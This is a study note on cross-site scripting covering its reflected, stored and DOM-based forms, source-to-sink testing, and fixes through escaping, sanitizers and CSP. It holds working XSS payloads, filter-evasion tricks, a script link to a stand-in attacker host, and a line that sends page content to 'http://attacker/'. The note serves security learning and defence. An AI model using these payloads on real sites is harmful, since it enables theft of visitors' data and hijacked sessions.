#webapplications

Cross-site scripting runs attacker-controlled JavaScript in a trusted page — the visitor's own browser executes it. Starts with HTML injection: unsafe insertion of input changes page *structure*, not just displayed text.
```
Unsafe:    body = "<p>Search value: " + q + "</p>"
Corrected: body = "<p>Search value: " + escape(q) + "</p>"
```
Escaping a value for its HTML position turns the same input into inert text — this is the actual fix, for all three variants below.

## Reflected XSS
Input from *this request* returns inside the response HTML — one request, one victim, usually delivered via a crafted link:
```
https://insecure-website.com/comment?message=<script src=https://evil-user.net/badscript.js></script>
```
Test payload (works without literal `<script>`, via an event handler):
```html
<img src="/missing-demo.png" onerror="document.querySelector('#proof').textContent='Script ran'">
```

## Stored XSS
Visitor A submits something (comment, profile field, filename); it's saved. Visitor B opens the page later and the stored value executes in *their* browser — no crafted link needed, much bigger blast radius than reflected.
```python
# unsafe
body += "<div>" + comment + "</div>"
# corrected
body += "<div>" + escape(comment) + "</div>"
```
Correcting the escaping fixes rendering of *both* old and new content going forward. Intentional rich text (a "format my comment" feature) needs a maintained HTML sanitizer with a narrow allowed-tag policy — not just escaping everything.

## DOM-based XSS
The attack-bearing input never touches the server at all — it flows entirely in the browser, often from the URL fragment (`location.hash`), which an HTTP-only proxy/WAF can't see. The vulnerability needs both a **source** (attacker-controlled input) and a **sink** (a place that interprets it dangerously).

```js
// Source: location.hash (URL fragment, never sent to server)
// Sink: innerHTML (parsed as HTML)
const value = decodeURIComponent(location.hash.slice(1));
message.innerHTML = value;      // unsafe sink — parses input as HTML
message.textContent = value;    // safe sink — inserts as plain text
```

### Testing workflow
1. **Identify source→sink.** Don't spray payloads — grep the page JS for sinks and sources first:
   - **Sinks (dangerous):** `innerHTML`, `document.write()`, `eval()`, `.html()` (jQuery), `setTimeout(str, ...)`, `Function(str)()`
   - **Sources (attacker-controlled):** `location.hash`, `location.search`, `document.referrer`, `postMessage`, `fetch` responses

2. **Understand why `<script>` doesn't work via `innerHTML`.** The browser spec says `<script>` inserted via `innerHTML` never executes — it's parsed as an inert tag. Use **event handlers instead**, which do fire:
   ```
   <img src=x onerror=prompt(1)>      ← src=x fails → onerror fires
   <svg onload=prompt(1)>
   <body onload=prompt(1)>
   ```

3. **Deliver via the actual source.** Payload goes in the URL fragment/query/referrer — whichever the page reads:
   ```
   https://target/page#<img src=x onerror=prompt(1)>
   https://target/page?msg=<img src=x onerror=prompt(1)>
   ```

4. **URL-encode to survive the transform.** If the page does `decodeURIComponent()`, your payload gets decoded once — spaces and special chars must survive:
   ```
   Raw:     <img src=x onerror=prompt(1)>
   Encoded: %3Cimg%20src%3Dx%20onerror%3Dprompt(1)%3E
   ```

5. **Use a canary when unsure if you're in the right sink.** Inject `MARKER_XYZ<img ...>` and check DevTools → Elements:
   - Shows as HTML with broken-image icon → sink is live, payload executed.
   - Shows as literal text `MARKER_XYZ<img...` → it's `textContent`, not exploitable.
   - Gone entirely → something's filtering; you need evasion.

### Payload by context (what escaping works)
| Context | Payload | Example |
| --- | --- | --- |
| HTML body | Event handler tag | `<img src=x onerror=prompt(1)>` or `<svg onload=prompt(1)>` |
| Breaking out of HTML attribute | Quote + tag | `"><img src=x onerror=prompt(1)>` (closes the attribute, breaks the tag) |
| Inside a JS string (rare in DOM context) | Escape the string, break out | `';prompt(1);//` or `\`prompt(1)\`` (backticks are JS template literals) |
| `href`/`src` attributes | `javascript:` protocol | `<a href="javascript:prompt(1)">click</a>` |
| Filter evasion | Case toggle, entity encoding, backticks | `<ScRiPt>` or `onerror=prompt\`1`` or `&#60;img` |

### Filter evasion
If basic payloads get blocked:
- **Case-toggle:** `<img>` → `<ImG>`, `<SVG>`, `onerror` → `onError`, `oNloaD`
- **Backtick in string:** `onerror=prompt\`1`` (splits a filter looking for `prompt(1)`)
- **Entity-encode:** `<` → `&#60;` or `%3C`, but only if the sink decodes it
- **atob():** `eval(atob('cHJvbXB0KDEp'))` — base64-encoded, bypasses string filters
- **Comment insertion:** `prompt/*x*/(1)` if a filter removes `prompt(`

### Proof of exploitation
Choose based on what the page actually checks:
- **`prompt(1)`** — survives filters that block `alert` specifically
- **`alert(document.domain)`** — shows the origin, stronger evidence
- **Set a flag:** `onerror="window.labSolved=true"` then check DevTools console for `window.labSolved`
- **Exfiltrate data:** `new Image().src='http://attacker/?data='+document.body.innerHTML`
- **DOM manipulation:** `document.body.innerHTML='<h1>PWNED</h1>'` — immediate visual proof

## CSS injection
Less obvious, same root cause — if a "theme" or "color" value reaches CSS unescaped, a closing brace lets the input define new rules:
```
Input:  red; } body { background: #ffe083; } #banner { font-size: 38px;
```
This changes presentation, not execution — but it's still unsanitized input reaching an interpreter. Fix: map input to an allowlist of server-owned values rather than interpolating it directly.
```python
themes = {"navy": "#163047", "green": "#176747"}
color = themes.get(input_theme, "#163047")
```

## Layered defenses — CSP
No single layer is reliable alone:
| Layer | Role |
| --- | --- |
| Safe output context + DOM APIs (`textContent`, escaping) | Corrects the unsafe interpretation — the real fix |
| Strict Content-Security-Policy | Limits execution if a rendering bug remains |
| `HttpOnly` + server-side permission checks | Reduces cookie disclosure and limits what a successful XSS can actually do |

```
Content-Security-Policy: script-src 'nonce-RANDOM'; object-src 'none'; base-uri 'none'
```
With a strict CSP, the application's own (nonced) script still runs while an injected inline handler is blocked. **XSS can make authenticated requests without ever reading the cookie — `HttpOnly` limits cookie theft, it does not repair XSS**, and a working CSP doesn't either; both are defense-in-depth around the actual escaping fix.
